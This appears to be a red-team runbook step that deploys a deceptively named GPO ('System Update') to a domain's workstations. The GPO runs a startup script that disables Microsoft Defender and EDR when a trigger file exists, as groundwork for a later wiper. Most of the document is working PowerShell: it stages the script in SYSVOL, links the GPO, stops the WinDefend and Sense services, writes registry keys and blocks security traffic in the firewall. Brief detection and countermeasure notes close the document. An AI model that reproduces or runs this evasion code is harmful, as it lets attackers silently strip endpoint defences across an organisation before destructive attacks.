
# Step 4a: Deploy GPO with Triggered Defender Disable Script

**Objective**: Deploy a GPO startup script (`disable_defender_triggered.ps1`) that disables Microsoft Defender and EDR tools only when a trigger file (`run_trigger.txt`) is present.

---

## Context

- Red Team has administrative control of the Domain Controller (`infra-dc1`)
- Goal is to pre-position defense evasion capability without triggering immediate detection
- Destructive wiper logic will be handled separately in a later step

---

## Execution

### 1. Upload Script to SYSVOL

```powershell
Copy-Item -Path C:\RedTeam\disable_defender_triggered.ps1 -Destination \\infra-dc1\SYSVOL\domain.com\scripts\
```

### 2. Create and Configure the GPO

```powershell
New-GPO -Name "System Update" -Comment "Defender Evasion Script"
Set-GPStartupScript -Name "System Update" -ScriptName "disable_defender_triggered.ps1"
New-GPLink -Name "System Update" -Target "OU=Workstations,DC=domain,DC=com"
```

### 3. Script Logic Summary

The script below disables Microsoft Defender and EDR tools **only if** the file `C:\Windows\Temp\run_trigger.txt` exists:

```powershell
$triggerPath = "C:\Windows\Temp\run_trigger.txt"

if (Test-Path $triggerPath) {
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableBehaviorMonitoring $true
    Set-MpPreference -DisableIOAVProtection $true
    Set-MpPreference -DisableScriptScanning $true

    Stop-Service -Name 'WinDefend' -Force
    Stop-Service -Name 'Sense' -Force

    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -PropertyType DWORD -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -PropertyType DWORD -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIOAVProtection" -Value 1 -PropertyType DWORD -Force

    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
    netsh advfirewall firewall add rule name="Block Security Outbound" dir=out action=block remoteip=*.defender.com enable=yes
}
```

---

## Result

- Defender and EDR evasion is deployed across the domain but remains dormant
- Can be activated at any time using a simple trigger file + reboot

---

## Detection Opportunities

| Event ID | Description |
|----------|-------------|
| 5136     | GPO created or modified |
| PowerShell logs | Script execution via GPO |
| File system | `disable_defender_triggered.ps1` dropped to SYSVOL |

---

## Defensive Countermeasures

- Monitor for new startup scripts in SYSVOL
- Alert on changes to GPOs outside approved channels
- Use tamper-proof logging and AppLocker to prevent script-based AV bypass

